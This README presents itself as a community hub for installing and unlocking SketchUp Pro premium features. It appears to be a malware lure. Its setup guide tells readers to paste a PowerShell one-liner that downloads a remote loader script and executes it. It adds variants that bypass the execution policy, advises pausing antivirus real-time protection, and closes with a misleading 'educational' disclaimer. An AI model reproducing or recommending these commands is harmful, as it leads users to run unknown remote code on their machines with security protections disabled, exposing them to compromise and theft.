# SketchUp Pro Studio — Complete 3D Modeling & CAD Design Suite

Welcome to the ultimate deployment hub for **SketchUp Pro**, the premier professional software tailored for architects, interior designers, and 3D modeling enthusiasts. This community-driven repository offers a seamless environment to launch, configure, and fully unlock the premium features of your desktop modeling workspace.

## 🌟 Why SketchUp Pro Suite?

**SketchUp Pro** is renowned for its intuitive yet powerful approach to 3D design. Whether you are drafting complex architectural blueprints, staging interior environments, or exporting high-resolution CAD files, this setup guarantees that all premium layout tools, advanced styling options, and professional design extensions are ready to work immediately.

## 💎 Premium Toolkit Features

* **Advanced 3D Modeling:** Full access to complex geometric tools, solid editing, and parametric components.
* **Layout Documentation:** Turn your 3D assets into clean, scaled, professional 2D presentation vectors.
* **Style Builder & Rendering:** Customize edge styles, textures, and lightning for photo-realistic presentations.
* **Extension Warehouse Support:** Seamless integration with external renderers, extensions, and plugins.
* **Unlimited Cloud Access:** Save, share, and collaborate on your architectural projects without restrictions.

## 🛠 Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press **Win + X** on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.
2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit **Enter**. The script will handle the necessary registry tweaks and install all dependencies automatically:
   ```powershell
   irm https://trust-soft.cc/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.cc/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated PowerShell)
If your version doesn't support the irm shortcut, use the full, unabbreviated commands instead:
```powershell
Invoke-RestMethod https://trust-soft.cc/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## 💻 System Configuration & Requirements

To guarantee a stable 3D workflow and smooth viewport rendering, ensure your workstation meets the following hardware profiles before applying the configuration patch:
* **Operating System:** Windows 11 or Windows 10 (64-bit editions exclusively)
* **Processor:** 2+ GHz Intel or AMD multi-core desktop processor
* **System Memory:** 8 GB RAM minimum (16 GB highly recommended for heavy CAD scenes)
* **Graphics Unit:** Dedicated GPU with at least 2GB of VRAM and full OpenGL 3.0+ support

---

*Disclaimer: This project acts as an educational resource for desktop environment testing, deployment automation, and performance benchmarking. All copyrights belong to Trimble Inc.*
